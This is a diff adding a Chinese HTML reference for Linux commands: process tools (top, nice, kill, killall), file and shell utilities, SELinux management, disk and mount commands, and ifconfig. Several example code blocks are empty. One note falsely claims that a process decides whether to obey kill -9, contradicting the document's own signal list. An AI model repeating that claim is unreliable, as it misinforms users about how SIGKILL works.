+<li>TIME+：进程使用的 CPU 时间总计，单位 1/100 秒</li>
+<li>%MEM：进程使用的物理内存百分比</li>
+<li>VIRT：进程使用的虚拟内存总量，单位 kb。VIRT=SWAP+RES</li>
+<li>SWAP：进程使用的虚拟内存中，被换出的大小，单位 kb</li>
+<li>RES：进程使用的、未被换出的物理内存大小，单位 kb。RES=CODE+DATA</li>
+<li>CODE：可执行代码占用的物理内存大小，单位 kb</li>
+<li>DATA：可执行代码以外的部分(数据段 + 栈)占用的物理内存大小，单位 kb</li>
+<li>SHR：共享内存大小，单位 kb</li>
+<li>nFLT：页面错误次数</li>
+<li>nDRT：最后一次写入到现在，被修改过的页面数。</li>
+<li>S：进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程</li>
+<li>COMMAND：命令名/命令行</li>
+<li>WCHAN：若该进程在睡眠，则显示睡眠中的系统函数名</li>
+<li>Flags：任务标志</li>
+</ul>
+<h3> nice</h3>
+<p>nice 用于调整进程的优先级，语法格式：<code>nice 优先级数字 服务名称</code></p>
+<blockquote>
+<p>优先级的范围：-20 — 19。共 40 个等级，其中数值越小优先级越高，数值越大优先级越低，即 -20 的优先级最高，19 的优先级最低</p>
+</blockquote>
+<p>-n：指定优先级数</p>
+<p>example：</p>
+<p><code>nice -n -20 sshd</code></p>
+<h3> pidof</h3>
+<p>pidof 用于查询某个指定服务进程的 PID 值，语法格式：<code>pidof [选项] 服务名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">仅返回一个进程号</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">仅显示具有相同 “root” 目录的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">显示由脚本开启的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">-o</td>
+<td style="text-align:left">指定不显示的进程 ID</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>pidof sshd</code></p>
+<h3> kill</h3>
+<p>kill 用于终止指定 PID 值的服务进程，语法格式：<code>kill [选项] 进程的PID</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">信号，如果不加信号的编号选项，则使用 “-l” 选项会列出全部的信号名称</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">当处理当前进程时，不限制命令名和进程号的对应关系</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">指定 kill 命令只打印相关进程的进程号，而不发送任何信号</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">指定发送信号</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">指定用户</td>
+</tr>
+</tbody>
+</table>
+<p>信号值：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol>
+<li>SIGHUP：终端的控制进程结束，通知 session 内的各个作业，脱离关系</li>
+<li>SIGINT：中断（同 Ctrl + C）</li>
+<li>SIGQUIT：退出（同 Ctrl + \），产生 core 文件</li>
+<li>SIGILL：执行了非法指令，可执行文件本身出现错误</li>
+<li>SIGTRAP：有断点指令或其他 trap 指令产生，有 debugger 使用</li>
+<li>SIGABRT：调用 abort 函数生成的信号</li>
+<li>SIGBUS：非法地址（内存地址对齐出错）</li>
+<li>SIGFPE：致命的算术错误（浮点数运算，溢出，及除数为 0 错误）</li>
+<li>SIGKILL：强制终止，用来立即结束程序的运行（不能为阻塞，处理，忽略）</li>
+<li>SIGUSR1：用户使用</li>
+<li>SIGSEGV：访问内存错误</li>
+<li>SIGUSR2：用户使用</li>
+<li>SIGPIPE：管道破裂</li>
+<li>SIGALRM：时钟定时信号</li>
+<li>SIGTERM：终止（正常停止一个进程），程序结束信号（可被阻塞，处理）</li>
+<li>SIGSTKFLT：协处理器栈堆错误</li>
+<li>SIGCHLD：子进程结束，父进程收到这个信号并进行处理，（wait 也可以）否则僵尸进程</li>
+<li>SIGCONT：让一个停止的进程继续执行（不能被阻塞）</li>
+<li>SIGSTOP：让一个进程停止执行（不能被阻塞，处理，忽略）</li>
+<li>SIGTSTP：停止进程的运行（可以被处理和忽略）</li>
+<li>SIGTTIN：当后台作业要从用户终端读数据时, 该作业中的所有进程会收到 SIGTTIN 信号，缺省时这些进程会停止执行</li>
+<li>SIGTTOU：类似 SIGTTIN，但在写终端时收到</li>
+<li>SIGURG：有紧急数据或者 out—of—band 数据到达 socket 时产生</li>
+<li>SIGXCPU：超过 CPU 资源限定，这个限定可改变</li>
+<li>SIGXFSZ：当进程企图扩大文件以至于超过文件大小资源限制</li>
+<li>SIGVTALRM：虚拟时钟信号（计算的是该进程占用的 CPU 时间）</li>
+<li>SIGPROF：时钟信号（进程用的 CPU 时间及系统调用时间）</li>
+<li>SIGWINCH：窗口大小改变时发出</li>
+<li>SIGIO：文件描述符准备就绪，可以进行读写操作</li>
+<li>SIGPWR：power failure</li>
+<li>SIGSYS：非法的系统调用</li>
+</ol>
+<blockquote>
+<p>linux 的 kill 命令是向进程发送信号，kill 不是杀死的意思，-9 表示无条件退出，但由进程自行决定是否退出，这就是为什么 kill -9 终止不了系统进程和守护进程的原因。</p>
+</blockquote>
+<p>example：</p>
+<p><code>kill -9 1050</code></p>
+<h3> killall</h3>
+<p>killall 用于终止指定名称服务所对应的全部进程，语法格式：<code>killall [选项] 服务名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-e 或 --exact</td>
+<td style="text-align:left">进程需要和名字完全相符</td>
+</tr>
+<tr>
+<td style="text-align:center">-I 或 --ignore-case</td>
+<td style="text-align:left">忽略大小写</td>
+</tr>
+<tr>
+<td style="text-align:center">-g 或 --process-group</td>
+<td style="text-align:left">结束进程组</td>
+</tr>
+<tr>
+<td style="text-align:center">-i 或 --interactive</td>
+<td style="text-align:left">结束之前询问</td>
+</tr>
+<tr>
+<td style="text-align:center">-l 或 --list</td>
+<td style="text-align:left">列出所有的信号名称</td>
+</tr>
+<tr>
+<td style="text-align:center">-q 或 --quite</td>
+<td style="text-align:left">进程没有结束时，不输出任何信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-r 或 --regexp</td>
+<td style="text-align:left">将进程名模式解释为扩展的正则表达式</td>
+</tr>
+<tr>
+<td style="text-align:center">-s 或 --signal</td>
+<td style="text-align:left">发送指定信号</td>
+</tr>
+<tr>
+<td style="text-align:center">-u 或 --user</td>
+<td style="text-align:left">结束指定用户的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">-v 或 --verbose</td>
+<td style="text-align:left">显示详细执行过程</td>
+</tr>
+<tr>
+<td style="text-align:center">-w 或 --wait</td>
+<td style="text-align:left">等待所有的进程都结束</td>
+</tr>
+<tr>
+<td style="text-align:center">-V 或 --version</td>
+<td style="text-align:left">显示版本信息</td>
+</tr>
+<tr>
+<td style="text-align:center">--help</td>
+<td style="text-align:left">显示帮助信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>killall sshd</code></p>
+<h3> ln</h3>
+<p>ln 用于创建文件的软硬链接，语法格式：<code>ln [选项] 原始文件名 链接文件名</code></p>
+<blockquote>
+<p>软链接可以对文件、目录做软链接，也可以跨文件系统；硬链接只能对文件做硬链接，不能跨文件系统</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">创建 “软连接（符号链接）”，如果不带 -s 选项，则默认创建硬链接</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">强制创建文件或目录的链接</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">覆盖前先询问</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示创建链接的过程</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>ln -s aaa.txt bbb.txt</code></p>
+<h3> tee</h3>
+<p>tee 用于从标准输入读取，再写入标准输出和文件，语法格式：<code>tee [OPTION] [FILE]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">追加到文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">忽略终端信号</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">诊断写入非管道的错误</td>
+</tr>
+<tr>
+<td style="text-align:center">--output-error[=MODE]</td>
+<td style="text-align:left">设置输出错误的方式</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>MODE:
+<ul>
+<li>warn：写入遇到错误时诊断</li>
+<li>warn-nopipe：写入非管道遇到错误时诊断</li>
+<li>exit：写入遇到错误时退出</li>
+<li>exit-nopipe：写入非管道遇到错误时退出</li>
+</ul>
+</li>
+</ul>
+<p>如果没有指定 --output-error，tee 会在写入管道发生错误时立即退出，写入非管道时诊断</p>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> eval</h3>
+<p>eval 会对后面的 cmdLine 进行两遍扫描，如果第一遍扫描后，cmdLine 是个普通命令，则执行此命令；如果 cmdLine 中含有变量，则进行对变量的替换再执行命令。语法格式：<code>eval cmdLine</code></p>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
+<p>执行 <code>eval $myfile</code> 命令时，先将 <code>$myfile</code> 替换成 <code>cat test.txt</code>，执行 <code>eval cat test.txt</code> 此命令</p>
+</blockquote>
+<h3> bc</h3>
+<p>bc 是一种支持任意精度数字的语言，支持语句的交互式执行。语法格式：<code>bc [OPTION] [FILE]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-h,–help</td>
+<td style="text-align:left">打印此用法并退出</td>
+</tr>
+<tr>
+<td style="text-align:center">-i,–interactive</td>
+<td style="text-align:left">强制交互模式</td>
+</tr>
+<tr>
+<td style="text-align:center">-l,–mathlib</td>
+<td style="text-align:left">使用预定义的数学例程</td>
+</tr>
+<tr>
+<td style="text-align:center">-q,–quiet</td>
+<td style="text-align:left">不要打印初始横幅</td>
+</tr>
+<tr>
+<td style="text-align:center">-s,–standard</td>
+<td style="text-align:left">非标准 bc 构造是错误的</td>
+</tr>
+<tr>
+<td style="text-align:center">-w,–warn</td>
+<td style="text-align:left">警告非标准 bc 构造</td>
+</tr>
+<tr>
+<td style="text-align:center">-v,–version</td>
+<td style="text-align:left">打印版本信息并退出</td>
+</tr>
+</tbody>
+</table>
+<p><strong>支持的运算包括：</strong></p>
+<ul>
+<li>+ 加法</li>
+<li>- 减法</li>
+<li>* 乘法</li>
+<li>/ 除法</li>
+<li>^ 指数</li>
+<li>% 余数</li>
+</ul>
+<p><strong>特殊变量说明</strong></p>
+<ul>
+<li>浮点数精度变量，scale=10; 设置之后的 scale 为 10，默认为 0（及整数除法会返回整数）</li>
+<li>进制变量，obase=16;ibase=16; 设置输入和输出都为 16 进制，默认值为 10。<strong>注意</strong>：为 10 时可不设置ibaseobase 的值，obase 要尽量放在 ibase 前，因为 ibase 设置后，后面的数字都是以 ibase 的进制来换算的</li>
+<li>last，是指上一次返回出来的数字</li>
+<li>quit，退出计算</li>
+</ul>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> Linux 系统管理 SELinux 服务命令</h2>
+<h3> getenforce</h3>
+<p>getenforce 用于查看当前 SELinux 服务的运行模式，语法格式：<code>getenforce</code></p>
+<p>SELinux 运行模式：</p>
+<ul>
+<li>enforce：启用</li>
+<li>permissive：发出警告不拦截</li>
+<li>disabled：禁用</li>
+</ul>
+<p>example：</p>
+<p><code>getenforce</code></p>
+<h3> setenforce</h3>
+<p>setenforce 用于设置 SELinux 服务的运行模式，语法格式：<code>setenforce [0|1]</code></p>
+<blockquote>
+<p>0 为禁用，1 为启用</p>
+</blockquote>
+<p>example：</p>
+<p><code>setenforce 0</code></p>
+<h3> semanage</h3>
+<p>semanage 用于管理 SELinux 的策略，语法格式：<code>semanage [位置参数] [选项] 文件名</code></p>
+<blockquote>
+<p>可以使用 <code>semanage -h</code> 查看</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">位置参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">import</td>
+<td style="text-align:left">导入本地自定义</td>
+</tr>
+<tr>
+<td style="text-align:center">export</td>
+<td style="text-align:left">输出本地自定义</td>
+</tr>
+<tr>
+<td style="text-align:center">login</td>
+<td style="text-align:left">管理 linux 用户和 SELinux 之间的登录映射受限用户</td>
+</tr>
+<tr>
+<td style="text-align:center">user</td>
+<td style="text-align:left">管理 SELinux 受限用户（角色和级别 SELinux 用户）</td>
+</tr>
+<tr>
+<td style="text-align:center">port</td>
+<td style="text-align:left">管理网络端口类型定义</td>
+</tr>
+<tr>
+<td style="text-align:center">ibpkey</td>
+<td style="text-align:left">管理 infiniband ibpkey 类型定义</td>
+</tr>
+<tr>
+<td style="text-align:center">ibendport</td>
+<td style="text-align:left">管理 infiniband 端端口类型定义</td>
+</tr>
+<tr>
+<td style="text-align:center">interface</td>
+<td style="text-align:left">管理网络接口类型定义</td>
+</tr>
+<tr>
+<td style="text-align:center">module</td>
+<td style="text-align:left">管理 SELinux 策略模块</td>
+</tr>
+<tr>
+<td style="text-align:center">node</td>
+<td style="text-align:left">节点管理网络节点类型定义</td>
+</tr>
+<tr>
+<td style="text-align:center">fcontext</td>
+<td style="text-align:left">管理文件上下文映射定义</td>
+</tr>
+<tr>
+<td style="text-align:center">boolean</td>
+<td style="text-align:left">管理布尔值以选择性地启用功能</td>
+</tr>
+<tr>
+<td style="text-align:center">permissive</td>
+<td style="text-align:left">管理进程类型强制模式</td>
+</tr>
+<tr>
+<td style="text-align:center">dontaudit</td>
+<td style="text-align:left">在策略中禁用/启用 dontauedit 规则</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>可以使用 <code>semanage [位置参数] -h</code> 查看</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">查询</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">添加</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">修改</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">删除</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">SELinux 的对象类型</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> restorecon</h3>
+<p>restorecon 用于将设置好的 SELinux 安全上下文立即生效，语法格式：<code>restorecon [选项] 文件名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">递归</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示修改过程</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>restorecon -Rv /home/wwwroot/</code></p>
+<h3> getsebool</h3>
+<p>getsebool 用于查询 SELinux 安全策略的布尔值，语法格式：<code>getsebool [选项] [布尔值条款] </code></p>
+<blockquote>
+<p>getsebool 显示所有 SELinux 布尔值，其中 off 为禁止状态，on 为允许状态</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有 SELinux 布尔值</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">将修改后的 SELinux 策略永久生效且立即生效</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2> Linux 系统查看磁盘信息</h2>
+<h3> mount</h3>
+<p>mount 用于挂载文件系统，语法格式：<code>mount [选项] 文件系统 挂载目录</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">自动挂载所有在 /etc/fstab 中定义的文件系统</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">不规范化路径</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">显示文件系统标签</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">不要写入 /etc/mtab</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">以只读方式装载文件系统（与 -oro 相同）</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">指定文件系统类型</td>
+</tr>
+<tr>
+<td style="text-align:center">-w</td>
+<td style="text-align:left">挂载文件系统读写（默认）</td>
+</tr>
+<tr>
+<td style="text-align:center">-o&lt;选项&gt;</td>
+<td style="text-align:left">指定加载文件系统选项</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>mount -t ext4 /dev/sdb2 /backup</code></p>
+<p>-o 选项如下：</p>
+<ul>
+<li>async：以非同步的方式执行文件系统的输入、输出动作。</li>
+<li>atime：每次存取都更新 inode 的存取时间，默认设置，取消选项为 noatime。</li>
+<li>auto：必须在 /etc/fstab 文件中指定此选项。指定 -a 选项时，会加载设置为 auto 的设备，取消选项为 noauto。</li>
+<li>dev：可读文件系统上的字符或块设备，取消选项为 nodev。</li>
+<li>exec：可执行二进制文件，取消选项为 noexec。</li>
+<li>noatime：每次存取时不更新 inode 的存取时间。</li>
+<li>noauto：加入此选项，就无法使用 -a 选项来加载。</li>
+<li>nodev：不读文件系统上的字符或块设备。</li>
+<li>noexec：无法执行二进制文件。</li>
+<li>nosuid：关闭 set-user-identifier（设置用户 ID）与 set-group-identifer（设置组 ID）设置位。</li>
+<li>nouser：使用户无法执行加载操作，默认设置。</li>
+<li>iocharset=XXX：指定 mount 分区时使用的字符集。</li>
+<li>codepage=XXX：指定 mount 分区时使用的内码表。</li>
+<li>remount：重新加载设备。通常用于改变设备的设置状态。</li>
+<li>ro：以只读模式加载。</li>
+<li>rw：以可读写模式加载。</li>
+<li>suid：启动 set-user-identifier（设置用户 ID）与 set-group-identifer（设置组 ID）设置位，取消选项为 nosuid。</li>
+<li>sync：以同步方式执行文件系统的输入、输出动作。</li>
+<li>user：可以让一般用户加载设备。</li>
+<li>defaults：使用默认选项。默认选项为 rw、suid、dev、exec、anto、nouser 与 async。3）-t&lt;文件系统类型&gt;：指定设备的文件系统类型，常用选项如下：
+<ul>
+<li>ext3/ext2：Linux 目前的常用文件系统。</li>
+<li>msdos：MS-DOS 的 FAT。</li>
+<li>vfat：Windows 95/98 的 VFAT。</li>
+<li>nfs：网络文件系统。</li>
+<li>iso9660：CD-ROM 光盘的标准文件系统。</li>
+<li>ntfs：Windows NT 的文件系统。</li>
+</ul>
+</li>
+</ul>
+<h3> umount</h3>
+<p>umount 用于卸载设备或文件系统，语法格式：<code>umount [设备文件/挂载目录]</code></p>
+<blockquote>
+<p>如果当前就处在设备所挂载的目录时，系统会提升该设备繁忙，只需退出到其它目录在使用 umount 命令即可</p>
+</blockquote>
+<p>example：</p>
+<p><code>umount /dev/sdb2</code></p>
+<h3> blkid</h3>
+<p>blkid 用于显示设备的属性信息，语法格式：<code>blkid [设备名]</code></p>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> df</h3>
+<p>df 用于查看已挂载的磁盘空间使用情况，语法格式：<code>df [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">查看所有文件系统，包括伪、重复、不可访问的文件系统</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">人类可读的显示大小，1024 次方（例如：1023M）</td>
+</tr>
+<tr>
+<td style="text-align:center">-H</td>
+<td style="text-align:left">显示大小为 1000 次方（例如：1.1G）</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">列出索引节点信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">本地文件系统列表</td>
+</tr>
+<tr>
+<td style="text-align:center">-T</td>
+<td style="text-align:left">显示文件系统类型</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>df -hT</code></p>
+<h3> fdisk</h3>
+<p>fdisk 用于新建、修改及删除磁盘的分区表信息，语法格式：<code>fdisk 磁盘名称</code></p>
+<blockquote>
+<p>fdisk 命令中的选项作用</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">m</td>
+<td style="text-align:left">查看全部可用的选项</td>
+</tr>
+<tr>
+<td style="text-align:center">n</td>
+<td style="text-align:left">添加新的分区</td>
+</tr>
+<tr>
+<td style="text-align:center">d</td>
+<td style="text-align:left">删除某个分区信息</td>
+</tr>
+<tr>
+<td style="text-align:center">l</td>
+<td style="text-align:left">列出所有可用的分区类型</td>
+</tr>
+<tr>
+<td style="text-align:center">t</td>
+<td style="text-align:left">改变某个分区的类型</td>
+</tr>
+<tr>
+<td style="text-align:center">p</td>
+<td style="text-align:left">查看分区表信息</td>
+</tr>
+<tr>
+<td style="text-align:center">w</td>
+<td style="text-align:left">保存并退出</td>
+</tr>
+<tr>
+<td style="text-align:center">q</td>
+<td style="text-align:left">不保存直接退出</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>fdisk /dev/sdb</code></p>
+<h3> mkfs</h3>
+<p>mkfs 用于格式化文件系统，语法格式：<code>mkfs.文件类型 磁盘名称</code></p>
+<p>example：</p>
+<p><code>mkfs.xfs /dev/sdb2</code></p>
+<h3> du</h3>
+<p>du 用于查看分区或目录所占用的磁盘容量大小，语法格式：<code>du [选项] 目录名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示目录中所有文件的大小</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">显示目录或文件大小时，以 byte 为单位</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和</td>
+</tr>
+<tr>
+<td style="text-align:center">-D</td>
+<td style="text-align:left">显示指定符号连接的源文件大小</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">以 K，M，G 为单位，提高信息的可读性</td>
+</tr>
+<tr>
+<td style="text-align:center">-H</td>
+<td style="text-align:left">与 -h 选项相同，但是 K，M，G 是以 1000 为换算单位</td>
+</tr>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:left">以 1024 bytes 为单位</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">重复计算硬件连接的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">以 1MB 为单位</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">仅显示总计</td>
+</tr>
+<tr>
+<td style="text-align:center">--max-depth</td>
+<td style="text-align:left">限制 du 应该遍历多少层子目录</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>du -sh /etc</code></p>
+<h3> fsck</h3>
+<p>fsck 用于检查文件系统并尝试修复错误，语法格式：<code>fsck [选项] [-t &lt;文件系统类型&gt;] [设备名]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>-A</code></td>
+<td style="text-align:left">检查所有文件系统</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-C[&lt;fd&gt;]</code></td>
+<td style="text-align:left">显示进度条；文件描述符用于 GUI</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-l</code></td>
+<td style="text-align:left">锁定设备以保证独占访问</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-M</code></td>
+<td style="text-align:left">不检查已装载的文件系统</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-N</code></td>
+<td style="text-align:left">不执行，只显示将要执行的操作</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-P</code></td>
+<td style="text-align:left">并行检查文件系统，包括根</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-R</code></td>
+<td style="text-align:left">跳过根文件系统；仅与 “-A” 一起使用</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-r[&lt;fd&gt;]</code></td>
+<td style="text-align:left">报告检查的每个设备的统计信息；文件描述符用于 GUI</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-s</code></td>
+<td style="text-align:left">序列化检查操作</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-T</code></td>
+<td style="text-align:left">启动时不显示标题</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-t&lt;type&gt;</code></td>
+<td style="text-align:left">指定要检查的文件系统类型；<code>&lt;type&gt;</code> 允许是逗号分隔的列表</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-V</code></td>
+<td style="text-align:left">显示过程</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> sync</h3>
+<p>sync 用于强制将内存缓冲区中的数据立即写入磁盘，语法格式：<code>sync [选项] [文件]</code></p>
+<blockquote>
+<p>用户通常无需执行 sync 命令，系统会自动执行 update 或 bdflush 操作，将缓冲区的数据写入磁盘。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">只同步文件数据，没有不需要的元数据</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">同步包含文件的文件系统</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>sync</code></p>
+<h2> Linux 系统状态检测命令</h2>
+<h3> ifconfig</h3>
+<p>ifconfig 用于获取网卡配置与网络状态等信息，语法格式：<code>ifconfig [选项] [网络设备]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有接口信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">显示简要信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有接口信息</td>
+</tr>
